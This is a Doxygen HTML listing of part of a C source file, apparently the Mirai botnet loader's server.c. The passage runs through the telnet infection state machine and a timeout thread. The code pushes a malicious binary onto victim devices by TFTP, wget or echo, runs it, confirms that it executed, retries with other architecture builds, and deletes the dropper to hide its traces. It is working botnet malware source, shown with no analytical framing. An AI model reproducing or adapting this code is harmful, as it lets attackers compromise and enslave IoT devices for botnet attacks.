href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a627db22e8e02d706f797acae50520614">total_wgets</a>);</div><div class="line"><a name="l00494"></a><span class="lineno">  494</span>&#160;                        }</div><div class="line"><a name="l00495"></a><span class="lineno">  495</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00496"></a><span class="lineno">  496</span>&#160;                    <span class="keywordflow">case</span> TELNET_UPLOAD_TFTP:</div><div class="line"><a name="l00497"></a><span class="lineno">  497</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a409abf934163dd8108edb43f47abca81">connection_upload_tftp</a>(conn);</div><div class="line"><a name="l00498"></a><span class="lineno">  498</span>&#160;                        <span class="keywordflow">if</span> (consumed &gt; 0)</div><div class="line"><a name="l00499"></a><span class="lineno">  499</span>&#160;                        {</div><div class="line"><a name="l00500"></a><span class="lineno">  500</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_RUN_BINARY;</div><div class="line"><a name="l00501"></a><span class="lineno">  501</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 30;</div><div class="line"><a name="l00502"></a><span class="lineno">  502</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00503"></a><span class="lineno">  503</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Finished tftp loading\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00504"></a><span class="lineno">  504</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00505"></a><span class="lineno">  505</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;./&quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot; %s.%s; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#aa3394da986d8b9f48acb15b49ec40fc6">EXEC_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a56f296116fba633d19e0b85f3516d6b1">id_tag</a>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00506"></a><span class="lineno">  506</span>&#160;                            <a class="code" href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a>(&amp;wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a9bced17fe889d8d2caa6328f8e9842a2">total_tftps</a>);</div><div class="line"><a name="l00507"></a><span class="lineno">  507</span>&#160;                        }</div><div class="line"><a name="l00508"></a><span class="lineno">  508</span>&#160;                        <span class="keywordflow">else</span> <span class="keywordflow">if</span> (consumed &lt; -1) <span class="comment">// Did not have permission to TFTP</span></div><div class="line"><a name="l00509"></a><span class="lineno">  509</span>&#160;                        {</div><div class="line"><a name="l00510"></a><span class="lineno">  510</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00511"></a><span class="lineno">  511</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] No permission to TFTP load, falling back to echo!\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00512"></a><span class="lineno">  512</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00513"></a><span class="lineno">  513</span>&#160;                            consumed *= -1;</div><div class="line"><a name="l00514"></a><span class="lineno">  514</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_ECHO;</div><div class="line"><a name="l00515"></a><span class="lineno">  515</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#a75346b6fb4a5ef349310143adbaf0647">upload_method</a> = UPLOAD_ECHO;</div><div class="line"><a name="l00516"></a><span class="lineno">  516</span>&#160;</div><div class="line"><a name="l00517"></a><span class="lineno">  517</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 30;</div><div class="line"><a name="l00518"></a><span class="lineno">  518</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox cp &quot;</span><a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; &gt; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; /bin/busybox chmod 777 &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00519"></a><span class="lineno">  519</span>&#160;                        }</div><div class="line"><a name="l00520"></a><span class="lineno">  520</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00521"></a><span class="lineno">  521</span>&#160;                    <span class="keywordflow">case</span> TELNET_RUN_BINARY:</div><div class="line"><a name="l00522"></a><span class="lineno">  522</span>&#160;                        <span class="keywordflow">if</span> ((consumed = <a class="code" href="connection_8c.html#a6f9962c0bc2cedaf0de2814f4a5d4b17">connection_verify_payload</a>(conn)) &gt; 0)</div><div class="line"><a name="l00523"></a><span class="lineno">  523</span>&#160;                        {</div><div class="line"><a name="l00524"></a><span class="lineno">  524</span>&#160;                            <span class="keywordflow">if</span> (consumed &gt;= 255)</div><div class="line"><a name="l00525"></a><span class="lineno">  525</span>&#160;                            {</div><div class="line"><a name="l00526"></a><span class="lineno">  526</span>&#160;                                conn-&gt;<a class="code" href="structconnection.html#af94e874a059f7b544e04e5d0561f7b98">success</a> = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00527"></a><span class="lineno">  527</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00528"></a><span class="lineno">  528</span>&#160;                                printf(<span class="stringliteral">&quot;[FD%d] Succesfully ran payload\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00529"></a><span class="lineno">  529</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00530"></a><span class="lineno">  530</span>&#160;                                consumed -= 255;</div><div class="line"><a name="l00531"></a><span class="lineno">  531</span>&#160;                            }</div><div class="line"><a name="l00532"></a><span class="lineno">  532</span>&#160;                            <span class="keywordflow">else</span></div><div class="line"><a name="l00533"></a><span class="lineno">  533</span>&#160;                            {</div><div class="line"><a name="l00534"></a><span class="lineno">  534</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00535"></a><span class="lineno">  535</span>&#160;                                printf(<span class="stringliteral">&quot;[FD%d] Failed to execute payload\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00536"></a><span class="lineno">  536</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00537"></a><span class="lineno">  537</span>&#160;                                <span class="keywordflow">if</span> (!conn-&gt;<a class="code" href="structconnection.html#a34571628b1d5cc8fb2d522ce53aa4045">retry_bin</a> &amp;&amp; strncmp(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>, <span class="stringliteral">&quot;arm&quot;</span>, 3) == 0)</div><div class="line"><a name="l00538"></a><span class="lineno">  538</span>&#160;                                {</div><div class="line"><a name="l00539"></a><span class="lineno">  539</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#ab61de117e5b46068d30be0c8a6f467ab">echo_load_pos</a> = 0;</div><div class="line"><a name="l00540"></a><span class="lineno">  540</span>&#160;                                    strcpy(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>, (conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>[3] == <span class="charliteral">&#39;\0&#39;</span> ? <span class="stringliteral">&quot;arm7&quot;</span> : <span class="stringliteral">&quot;arm&quot;</span>));</div><div class="line"><a name="l00541"></a><span class="lineno">  541</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#aa486c9e894a076331c57c4b3a4930df3">bin</a> = <a class="code" href="binary_8c.html#aaa1514c791103db3737fd7336a02bc70">binary_get_by_arch</a>(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00542"></a><span class="lineno">  542</span>&#160;                                    <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox wget; /bin/busybox tftp; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00543"></a><span class="lineno">  543</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_UPLOAD_METHODS;</div><div class="line"><a name="l00544"></a><span class="lineno">  544</span>&#160;                                    conn-&gt;<a class="code" href="structconnection.html#a34571628b1d5cc8fb2d522ce53aa4045">retry_bin</a> = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00545"></a><span class="lineno">  545</span>&#160;                                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00546"></a><span class="lineno">  546</span>&#160;                                }</div><div class="line"><a name="l00547"></a><span class="lineno">  547</span>&#160;                            }</div><div class="line"><a name="l00548"></a><span class="lineno">  548</span>&#160;<span class="preprocessor">#ifndef DEBUG</span></div><div class="line"><a name="l00549"></a><span class="lineno">  549</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;rm -rf &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;; &gt; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot;; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00550"></a><span class="lineno">  550</span>&#160;<span class="preprocessor">#else</span></div><div class="line"><a name="l00551"></a><span class="lineno">  551</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, TOKEN_QUERY <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00552"></a><span class="lineno">  552</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00553"></a><span class="lineno">  553</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_CLEANUP;</div><div class="line"><a name="l00554"></a><span class="lineno">  554</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 10;</div><div class="line"><a name="l00555"></a><span class="lineno">  555</span>&#160;                        }</div><div class="line"><a name="l00556"></a><span class="lineno">  556</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00557"></a><span class="lineno">  557</span>&#160;                    <span class="keywordflow">case</span> TELNET_CLEANUP:</div><div class="line"><a name="l00558"></a><span class="lineno">  558</span>&#160;                        <span class="keywordflow">if</span> ((consumed = <a class="code" href="connection_8c.html#a53ce7c6113c20961c61bbc6d64eae7c1">connection_consume_cleanup</a>(conn)) &gt; 0)</div><div class="line"><a name="l00559"></a><span class="lineno">  559</span>&#160;                        {</div><div class="line"><a name="l00560"></a><span class="lineno">  560</span>&#160;                            <span class="keywordtype">int</span> tfd = conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>;</div><div class="line"><a name="l00561"></a><span class="lineno">  561</span>&#160;</div><div class="line"><a name="l00562"></a><span class="lineno">  562</span>&#160;                            <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00563"></a><span class="lineno">  563</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00564"></a><span class="lineno">  564</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Cleaned up files\n&quot;</span>, tfd);</div><div class="line"><a name="l00565"></a><span class="lineno">  565</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00566"></a><span class="lineno">  566</span>&#160;                        }</div><div class="line"><a name="l00567"></a><span class="lineno">  567</span>&#160;                    <span class="keywordflow">default</span>:</div><div class="line"><a name="l00568"></a><span class="lineno">  568</span>&#160;                        consumed = 0;</div><div class="line"><a name="l00569"></a><span class="lineno">  569</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00570"></a><span class="lineno">  570</span>&#160;                }</div><div class="line"><a name="l00571"></a><span class="lineno">  571</span>&#160;</div><div class="line"><a name="l00572"></a><span class="lineno">  572</span>&#160;                <span class="keywordflow">if</span> (consumed == 0) <span class="comment">// We didn&#39;t consume any data</span></div><div class="line"><a name="l00573"></a><span class="lineno">  573</span>&#160;                    <span class="keywordflow">break</span>;</div><div class="line"><a name="l00574"></a><span class="lineno">  574</span>&#160;                <span class="keywordflow">else</span></div><div class="line"><a name="l00575"></a><span class="lineno">  575</span>&#160;                {</div><div class="line"><a name="l00576"></a><span class="lineno">  576</span>&#160;                    <span class="keywordflow">if</span> (consumed &gt; conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>)</div><div class="line"><a name="l00577"></a><span class="lineno">  577</span>&#160;                    {</div><div class="line"><a name="l00578"></a><span class="lineno">  578</span>&#160;                        consumed = conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>;</div><div class="line"><a name="l00579"></a><span class="lineno">  579</span>&#160;                        <span class="comment">//printf(&quot;consuming more then our position!\n&quot;);</span></div><div class="line"><a name="l00580"></a><span class="lineno">  580</span>&#160;                        <span class="comment">//abort();</span></div><div class="line"><a name="l00581"></a><span class="lineno">  581</span>&#160;                    }</div><div class="line"><a name="l00582"></a><span class="lineno">  582</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a> -= consumed;</div><div class="line"><a name="l00583"></a><span class="lineno">  583</span>&#160;                    memmove(conn-&gt;<a class="code" href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">rdbuf</a>, conn-&gt;<a class="code" href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">rdbuf</a> + consumed, conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>);</div><div class="line"><a name="l00584"></a><span class="lineno">  584</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">rdbuf</a>[conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>] = 0;</div><div class="line"><a name="l00585"></a><span class="lineno">  585</span>&#160;                }</div><div class="line"><a name="l00586"></a><span class="lineno">  586</span>&#160;</div><div class="line"><a name="l00587"></a><span class="lineno">  587</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a> &gt; 8196)</div><div class="line"><a name="l00588"></a><span class="lineno">  588</span>&#160;                {</div><div class="line"><a name="l00589"></a><span class="lineno">  589</span>&#160;                    printf(<span class="stringliteral">&quot;oversized buffer! 2\n&quot;</span>);</div><div class="line"><a name="l00590"></a><span class="lineno">  590</span>&#160;                    abort();</div><div class="line"><a name="l00591"></a><span class="lineno">  591</span>&#160;                }</div><div class="line"><a name="l00592"></a><span class="lineno">  592</span>&#160;            }</div><div class="line"><a name="l00593"></a><span class="lineno">  593</span>&#160;        }</div><div class="line"><a name="l00594"></a><span class="lineno">  594</span>&#160;    }</div><div class="line"><a name="l00595"></a><span class="lineno">  595</span>&#160;}</div><div class="line"><a name="l00596"></a><span class="lineno">  596</span>&#160;</div><div class="line"><a name="l00597"></a><span class="lineno"><a class="line" href="server_8c.html#ad0ffd480caf2f4573b8ededde26577e2">  597</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> *<a class="code" href="server_8c.html#ad0ffd480caf2f4573b8ededde26577e2">timeout_thread</a>(<span class="keywordtype">void</span> *arg)</div><div class="line"><a name="l00598"></a><span class="lineno">  598</span>&#160;{</div><div class="line"><a name="l00599"></a><span class="lineno">  599</span>&#160;    <span class="keyword">struct </span><a class="code" href="structserver.html">server</a> *<a class="code" href="loader_2src_2main_8c.html#a1b6916fd6bd625513f86cc35333623c9">srv</a> = (<span class="keyword">struct </span><a class="code" href="structserver.html">server</a> *)arg;</div><div class="line"><a name="l00600"></a><span class="lineno">  600</span>&#160;    <span class="keywordtype">int</span> i, ct;</div><div class="line"><a name="l00601"></a><span class="lineno">  601</span>&#160;</div><div class="line"><a name="l00602"></a><span class="lineno">  602</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00603"></a><span class="lineno">  603</span>&#160;    {</div><div class="line"><a name="l00604"></a><span class="lineno">  604</span>&#160;        ct = time(NULL);</div><div class="line"><a name="l00605"></a><span class="lineno">  605</span>&#160;</div><div class="line"><a name="l00606"></a><span class="lineno">  606</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; (srv-&gt;<a class="code" href="structserver.html#a3dc885b39e0b71d53698b376f161d9df">max_open</a> * 2); i++)</div><div class="line"><a name="l00607"></a><span class="lineno">  607</span>&#160;        {</div><div class="line"><a name="l00608"></a><span class="lineno">  608</span>&#160;            <span class="keyword">struct </span><a class="code" href="structconnection.html">connection</a> *conn = srv-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a>[i];</div><div class="line"><a name="l00609"></a><span class="lineno">  609</span>&#160;</div><div class="line"><a name="l00610"></a><span class="lineno">  610</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">open</a> &amp;&amp; conn-&gt;<a class="code" href="structconnection.html#a873bc9bb606802da7e4437e60581e060">last_recv</a> &gt; 0 &amp;&amp; ct - conn-&gt;<a class="code" href="structconnection.html#a873bc9bb606802da7e4437e60581e060">last_recv</a> &gt; conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a>)</div><div class="line"><a name="l00611"></a><span class="lineno">  611</span>&#160;            {</div><div class="line"><a name="l00612"></a><span class="lineno">  612</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00613"></a><span class="lineno">  613</span>&#160;                printf(<span class="stringliteral">&quot;[FD%d] Timed out\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>);</div><div class="line"><a name="l00614"></a><span class="lineno">  614</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00615"></a><span class="lineno">  615</span>&#160;                <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> == <a class="code" href="structconnection.html#a73be799c1ca19234b30e96e2f06caa16a0d9a35143bfc7e28f84ab889d545891b">TELNET_RUN_BINARY</a> &amp;&amp; !conn-&gt;<a class="code" href="structconnection.html#a60a7f9c761d0dc54437ed5d7e3306671">ctrlc_retry</a> &amp;&amp; strncmp(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>, <span class="stringliteral">&quot;arm&quot;</span>, 3) == 0)</div><div class="line"><a name="l00616"></a><span class="lineno">  616</span>&#160;                {</div><div class="line"><a name="l00617"></a><span class="lineno">  617</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#a873bc9bb606802da7e4437e60581e060">last_recv</a> = time(NULL);</div><div class="line"><a name="l00618"></a><span class="lineno">  618</span>&#160;                    <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;\x03\x1Akill %%1\r\nrm -rf &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a85a1175098aa9c4ddbd77bcf4146aea2">FN_BINARY</a> <span class="stringliteral">&quot; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a1f11c989e7b279aa0b76b472b6786221">FN_DROPPER</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00619"></a><span class="lineno">  619</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#a60a7f9c761d0dc54437ed5d7e3306671">ctrlc_retry</a> = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00620"></a><span class="lineno">  620</span>&#160;</div><div class="line"><a name="l00621"></a><span class="lineno">  621</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#ab61de117e5b46068d30be0c8a6f467ab">echo_load_pos</a> = 0;</div><div class="line"><a name="l00622"></a><span class="lineno">  622</span>&#160;                    strcpy(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>, (conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>[3] == <span class="charliteral">&#39;\0&#39;</span> ? <span class="stringliteral">&quot;arm7&quot;</span> : <span class="stringliteral">&quot;arm&quot;</span>));</div><div class="line"><a name="l00623"></a><span class="lineno">  623</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#aa486c9e894a076331c57c4b3a4930df3">bin</a> = <a class="code" href="binary_8c.html#aaa1514c791103db3737fd7336a02bc70">binary_get_by_arch</a>(conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acf9811de9d97268f2a793111fc4b9848">arch</a>);</div><div class="line"><a name="l00624"></a><span class="lineno">  624</span>&#160;                    <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox wget; /bin/busybox tftp; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00625"></a><span class="lineno">  625</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = <a class="code" href="structconnection.html#a73be799c1ca19234b30e96e2f06caa16a105b1b97096fc45bc18b386bd82c394e">TELNET_UPLOAD_METHODS</a>;</div><div class="line"><a name="l00626"></a><span class="lineno">  626</span>&#160;                    conn-&gt;<a class="code" href="structconnection.html#a34571628b1d5cc8fb2d522ce53aa4045">retry_bin</a> = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00627"></a><span class="lineno">  627</span>&#160;                } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00628"></a><span class="lineno">  628</span>&#160;                    <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00629"></a><span class="lineno">  629</span>&#160;                }</div><div class="line"><a name="l00630"></a><span class="lineno">  630</span>&#160;            } <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">open</a> &amp;&amp; conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#a1c60f0a6ddc515bda7d7965f357e875e">deadline</a> != 0 &amp;&amp; time(NULL) &gt; conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#a1c60f0a6ddc515bda7d7965f357e875e">deadline</a>)</div><div class="line"><a name="l00631"></a><span class="lineno">  631</span>&#160;            {</div><div class="line"><a name="l00632"></a><span class="lineno">  632</span>&#160;                conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#a1c60f0a6ddc515bda7d7965f357e875e">deadline</a> = 0;</div><div class="line"><a name="l00633"></a><span class="lineno">  633</span>&#160;                <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#ad12b2efcdef5532753e20ba3a5d41bb2">data</a>);</div><div class="line"><a name="l00634"></a><span class="lineno">  634</span>&#160;            }</div><div class="line"><a name="l00635"></a><span class="lineno">  635</span>&#160;        }</div><div class="line"><a name="l00636"></a><span class="lineno">  636</span>&#160;</div><div class="line"><a name="l00637"></a><span class="lineno">  637</span>&#160;        sleep(1);</div><div class="line"><a name="l00638"></a><span class="lineno">  638</span>&#160;    }</div><div class="line"><a name="l00639"></a><span class="lineno">  639</span>&#160;}</div><div class="line"><a name="l00640"></a><span class="lineno">  640</span>&#160;</div><div class="ttc" id="structserver_html_a1e2b34c57e3b5606aa8446e64823d725"><div class="ttname"><a href="structserver.html#a1e2b34c57e3b5606aa8446e64823d725">server::wget_host_port</a></div><div class="ttdeci">port_t wget_host_port</div><div class="ttdef"><b>Definition:</b> <a href="server_8h_source.html#l00017">server.h:17</a></div></div>
<div class="ttc" id="structconnection_html_a60a7f9c761d0dc54437ed5d7e3306671"><div class="ttname"><a href="structconnection.html#a60a7f9c761d0dc54437ed5d7e3306671">connection::ctrlc_retry</a></div><div class="ttdeci">BOOL ctrlc_retry</div><div class="ttdef"><b>Definition:</b> <a href="connection_8h_source.html#l00042">connection.h:42</a></div></div>
